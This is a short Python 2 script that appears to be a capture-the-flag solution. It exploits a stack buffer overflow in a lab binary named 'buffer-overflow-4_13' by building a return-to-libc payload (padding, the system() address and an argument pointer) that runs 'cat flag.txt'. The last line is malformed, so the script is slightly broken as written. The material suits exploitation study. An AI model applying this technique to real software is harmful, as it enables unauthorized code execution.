from os import execve
from struct import pack
from platform import machine
from subprocess import Popen, PIPE, STDOUT
import time
p = Popen(['/problems/buffer-overflow-4_13/./vuln'], stdout=PIPE, stdin=PIPE, stderr=STDOUT, bufsize=1)
time.sleep(.1)
str1 =p.stdout.readline()
str2= p.stdout.readline().rstrip()
print str1
print str2
st = str2.rsplit(' ', 1)[1]
binsh1 = hex(int(st,16)+172)
binsh2 = int(binsh1,16)
system =0x08048410 # Address of system()
exit = 0xf762c1b0 # Address of exit()
arg = "cat flag.txt\n"
payload = "A" * 160+"\x10\x84\x04\x08"*2+pack("<I", binsh2)+arg print p.communicate(payload)[0].rstrip()